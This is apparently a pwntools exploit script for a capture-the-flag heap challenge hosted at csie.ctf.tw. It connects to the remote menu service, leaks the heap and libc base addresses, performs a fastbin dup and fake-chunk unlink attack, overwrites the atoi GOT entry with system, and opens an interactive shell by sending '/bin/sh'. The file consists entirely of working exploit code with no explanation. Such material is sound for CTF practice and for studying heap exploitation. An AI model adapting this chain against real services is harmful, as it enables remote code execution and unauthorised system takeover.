#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
host = 'csie.ctf.tw'
port = 10140
p = 0x0000000000602100
r = remote(host, port)
#context.log_level = 0
def add_profile(name, age, length, data):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(str(age))
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(data)

def show(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def edit(idx, name, age, data):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(name)
    if name == '\x00':
        return
    r.recvuntil(":")
    r.sendline(str(age))
    r.recvuntil(":")
    r.sendline(data)

def delete(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

add_profile('a', 1, 0x90, "aaaa")
add_profile('b', 1, 0x90, "bbbb")
add_profile('c', 1, 0x90, "cccc")
delete(0)
delete(1)
delete(2)

add_profile('a', 1, 0x90 + 0x20, "".ljust(0xa0, "a"))
add_profile('\x00', 1, 0x90, "".ljust(0x80, "b"))
add_profile('c', 1, 0x90, "".ljust(0x80, "c"))

edit(1, '', 1, 'bbbb')
show(1)
r.recvuntil("= Name : ")
heap_base = u64(r.recvuntil("=", drop=True)[:-1].ljust(8, "\x00"))
heap_base = heap_base - 0xa
r.recvuntil("====")
log.info("Leak heap base address {}".format(hex(heap_base)))

edit(1, "aaaaaaaa\x00", 1, "bbbb")
show(1)
r.recvuntil("aaaaaaaa")
unsort_bin = u64(r.recvuntil("\x0a", drop=True).ljust(8, "\x00"))
libc = unsort_bin - 0x3c4b78
r.recvuntil("====")
log.info("Leak libc base address {}".format(hex(libc)))

### Fastbin dup attack
edit(1, '\x00', 1, "bbbb")
edit(0, "a"*8 + "\x21\x00", 1, "aaaa")
delete(0)
delete(1)
add_profile(p64(heap_base+0x10), 1, 0x90, "a") #0
add_profile("\x00", 1, 0xb0, "".ljust(0xa0, "b")) #1
add_profile("\x00", 1, 0x90, "".ljust(0x80, "c")) #3
add_profile("b"*8+"\x81\x03\x00", 1, 0x90, "d"*0x80+p64(0x370)+"\x21\x00") #4
delete(1)
log.info("Take fully control of the heap")

fake_chunk = p64(0) + p64(0x21)
fake_chunk += "a"*0xa0
fake_chunk += p64(0) + p64(0x21) + p64(0) + p64(0)
fake_chunk += p64(0) + p64(0xa1)
fake_chunk += "b"*0x90
fake_chunk += p64(0) + p64(0x21)
fake_chunk += p64(0) + p64(0)
fake_chunk += p64(0) + p64(0xb1)
fake_chunk += "c"*0xa0
fake_chunk += p64(0) + p64(0x91)
fake_chunk += p64(0x602158 - 0x18) + p64(0x602158 - 0x10)
fake_chunk += "d" * 0x70
fake_chunk += p64(0x90) + p64(0xa0)
add_profile("", 1, 0x370, fake_chunk)
delete(4)
atoi_got = 0x602098
system = libc + 0x45390
edit(3, "Bang", 1, p64(atoi_got))
edit(2, "Bang", 1, p64(system))
r.recvuntil(":")
r.sendline("/bin/sh")
r.interactive()
